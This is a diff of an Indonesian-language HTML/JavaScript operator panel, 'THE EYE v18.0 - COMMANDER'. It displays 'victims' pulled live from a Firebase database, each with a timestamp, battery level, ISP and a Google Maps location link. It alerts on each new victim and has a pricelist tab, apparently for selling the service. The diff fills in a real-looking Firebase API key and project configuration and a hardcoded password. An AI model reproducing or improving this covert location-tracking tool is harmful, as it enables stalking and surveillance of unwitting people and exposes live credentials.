@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THE EYE v18.0 - FIREBASE REALTIME</title>
+    <title>THE EYE v18.0 - COMMANDER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -32,12 +32,10 @@
 </div>
 
 <div id="app-interface" style="display: none;">
-    <div class="header" id="header-title">🛰️ RADAR FIREBASE</div>
-
+    <div class="header" id="header-title">🛰️ RADAR REALTIME</div>
     <div id="tab-radar" class="tab-content active-content">
-        <div id="log-list">Sedang menghubungkan ke Firebase Singapore...</div>
+        <div id="log-list">Menghubungkan ke Satelit Singapore...</div>
     </div>
-
     <div id="tab-cuan" class="tab-content">
         <div class="card">
             <h3>💰 PRICELIST</h3>
@@ -45,48 +43,39 @@
             <button onclick="doLogout()" style="background:#444;">LOGOUT</button>
         </div>
     </div>
-
     <div class="bottom-nav">
-        <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR FIREBASE', this)"><i>🛰️</i><span>Radar</span></div>
+        <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR', this)"><i>🛰️</i><span>Radar</span></div>
         <div class="nav-item" onclick="switchTab('tab-cuan', '💰 CUAN', this)"><i>💰</i><span>Cuan</span></div>
     </div>
 </div>
 
 <script>
-    // === TEMPEL CONFIG FIREBASE LU DISINI ===
+    // CONFIG KALZ TERPASANG 🎯
     const firebaseConfig = {
-        apiKey: "AIzaSy...",
-        authDomain: "theeyev18.firebaseapp.com",
-        databaseURL: "https://theeyev18-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "theeyev18",
-        storageBucket: "theeyev18.appspot.com",
-        messagingSenderId: "...",
-        appId: "..."
+      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
+      authDomain: "theeyes-8d0aa.firebaseapp.com",
+      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "theeyes-8d0aa",
+      storageBucket: "theeyes-8d0aa.firebasestorage.app",
+      messagingSenderId: "886775568743",
+      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
     };
-    // ========================================
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let logCount = 0;
 
-    function initApp() {
-        const saved = sessionStorage.getItem("user");
-        if(saved) renderDashboard();
-    }
-
+    function initApp() { if(sessionStorage.getItem("user")) renderDashboard(); }
     function doLogin() {
         if(document.getElementById('u').value === 'kalz' && document.getElementById('p').value === '111') {
-            sessionStorage.setItem("user", "kalz");
-            renderDashboard();
+            sessionStorage.setItem("user", "kalz"); renderDashboard();
         } else alert("AKSES DITOLAK!");
     }
-
     function renderDashboard() {
         document.getElementById('login-page').style.display='none';
         document.getElementById('app-interface').style.display='block';
         startRadar();
     }
-
     function switchTab(id, title, el) {
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-content'));
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
@@ -94,34 +83,23 @@
         document.getElementById('header-title').innerText = title;
         el.classList.add('active');
     }
-
     function startRadar() {
-        // MENGAMBIL DATA REALTIME DARI FIREBASE
         db.ref('korban').on('value', (snapshot) => {
             const data = snapshot.val();
             let html = "";
             let keys = data ? Object.keys(data).reverse() : [];
-            
             keys.forEach(id => {
                 const k = data[id];
-                html += `
-                    <div class="card" style="border-left-color:var(--red);">
-                        <b style="color:var(--red);">📍 TARGET TERDETEKSI!</b><br>
-                        🕒 ${k.waktu}<br>
-                        🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
-                        🌍 <a href="${k.maps}" target="_blank" style="color:blue; font-weight:bold;">BUKA LOKASI (MAPS)</a>
-                    </div>
-                `;
+                html += `<div class="card" style="border-left-color:var(--red);">
+                    <b style="color:var(--red);">📍 TARGET DETECTED!</b><br>
+                    🕒 ${k.waktu}<br>🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
+                    🌍 <a href="${k.maps}" target="_blank" style="color:blue; font-weight:bold;">BUKA MAPS</a>
+                </div>`;
             });
             document.getElementById('log-list').innerHTML = html || "Menunggu Mangsa...";
-            
-            if(keys.length > logCount) {
-                if(logCount !== 0) alert("🔥 JIRZ! KORBAN BARU MASUK!");
-                logCount = keys.length;
-            }
+            if(keys.length > logCount) { if(logCount !== 0) alert("🔥 JIRZ! KORBAN BARU!"); logCount = keys.length; }
         });
     }
-
     function doLogout() { sessionStorage.clear(); location.reload(); }
 </script>
 </body>
